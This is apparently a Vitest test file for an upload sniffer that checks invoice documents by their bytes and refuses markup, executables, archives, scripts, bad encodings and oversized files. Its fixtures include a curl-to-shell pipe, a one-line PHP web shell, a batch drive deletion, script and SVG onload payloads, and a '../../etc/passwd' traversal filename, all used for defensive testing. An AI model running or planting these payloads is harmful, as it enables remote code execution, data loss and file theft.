// @vitest-environment node
import { describe, expect, it } from 'vitest'
import { cleanFilename, decodeBase64, MAX_DOCUMENT_BYTES, sniffDocument } from './sniff.ts'

const bytes = (s: string | number[]) => (typeof s === 'string' ? new TextEncoder().encode(s) : Uint8Array.from(s))
const refused = (input: Uint8Array) => { const r = sniffDocument(input); return r.ok ? null : r.code }

describe('file type is read from the bytes, never the name', () => {
  it('accepts UTF-8 text and CSV, with or without a BOM', () => {
    expect(sniffDocument(bytes('Invoice no: INV-1\nAmount due: 10.00'))).toMatchObject({ ok: true, format: 'text' })
    expect(sniffDocument(bytes('Invoice,Amount\nINV-1,10.00\nINV-2,20.00'))).toMatchObject({ ok: true, format: 'csv' })
    expect(sniffDocument(bytes([0xef, 0xbb, 0xbf, ...bytes('Total due: 5.00')]))).toMatchObject({ ok: true, format: 'text', text: 'Total due: 5.00' })
  })

  it('stores PDF bytes without reading them', () => {
    expect(sniffDocument(bytes('%PDF-1.7\n%âãÏÓ\n1 0 obj'))).toEqual({ ok: true, format: 'pdf', text: null })
  })

  it('refuses HTML, SVG and XML however they are named', () => {
    expect(refused(bytes('<!DOCTYPE html><html><body>Invoice</body></html>'))).toBe('markup')
    expect(refused(bytes('Invoice\n<script>fetch("https://x.test")</script>'))).toBe('markup')
    expect(refused(bytes('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>'))).toBe('markup')
    expect(refused(bytes('<?xml version="1.0"?><invoice/>'))).toBe('markup')
    expect(refused(bytes('Pay here: javascript:alert(1)'))).toBe('markup')
  })

  it('refuses executables, archives, Office containers, images and RTF', () => {
    expect(refused(bytes([0x4d, 0x5a, 0x90, 0x00, 0x03]))).toBe('executable')
    expect(refused(bytes([0x7f, 0x45, 0x4c, 0x46, 0x02]))).toBe('executable')
    expect(refused(bytes([0xcf, 0xfa, 0xed, 0xfe, 0x07]))).toBe('executable')
    expect(refused(bytes([0x50, 0x4b, 0x03, 0x04, 0x14, 0x00]))).toBe('archive') // .docx/.xlsm are zips
    expect(refused(bytes([0x1f, 0x8b, 0x08, 0x00]))).toBe('archive')
    expect(refused(bytes([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1, 0x00]))).toBe('office_container')
    expect(refused(bytes([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a]))).toBe('image')
    expect(refused(bytes('{\\rtf1\\ansi invoice}'))).toBe('rtf')
  })

  it('refuses scripts and macro source', () => {
    expect(refused(bytes('#!/bin/sh\ncurl https://x.test | sh'))).toBe('script')
    expect(refused(bytes('<?php system($_GET["c"]); ?>'))).toBe('script')
    expect(refused(bytes('Attribute VB_Name = "Module1"\nSub AutoOpen()\nEnd Sub'))).toBe('script')
    expect(refused(bytes('@echo off\ndel C:\\'))).toBe('script')
  })

  it('refuses binary, non-UTF-8, UTF-16 and empty files', () => {
    expect(refused(bytes([0x49, 0x6e, 0x00, 0x76]))).toBe('binary')
    expect(refused(bytes([0x49, 0xff, 0xfe, 0x41]))).toBe('not_utf8')
    expect(refused(bytes([0xff, 0xfe, 0x49, 0x00]))).toBe('not_utf8')
    expect(refused(bytes(''))).toBe('empty')
    expect(refused(bytes('   \n\n  '))).toBe('empty')
  })

  it('refuses anything over 2 MB', () => {
    expect(refused(new Uint8Array(MAX_DOCUMENT_BYTES + 1).fill(0x41))).toBe('too_large')
    expect(sniffDocument(new Uint8Array(MAX_DOCUMENT_BYTES).fill(0x41)).ok).toBe(true)
  })
})

describe('base64 and filenames', () => {
  it('decodes strict base64 only', () => {
    expect(decodeBase64(Buffer.from('hello').toString('base64'))).toMatchObject({ ok: true })
    expect(decodeBase64('aGVsbG8')).toMatchObject({ ok: true })
    expect(decodeBase64('not base64!!')).toEqual({ ok: false, code: 'malformed' })
    expect(decodeBase64('a'.repeat(Math.ceil((MAX_DOCUMENT_BYTES * 4) / 3) + 8))).toEqual({ ok: false, code: 'too_large' })
  })

  it('keeps a display name only', () => {
    expect(cleanFilename('../../etc/passwd')).toBe('passwd')
    expect(cleanFilename('C:\\Users\\a\\inv<1>.txt')).toBe('inv1.txt')
    expect(cleanFilename('\u0000')).toBe('document')
  })
})
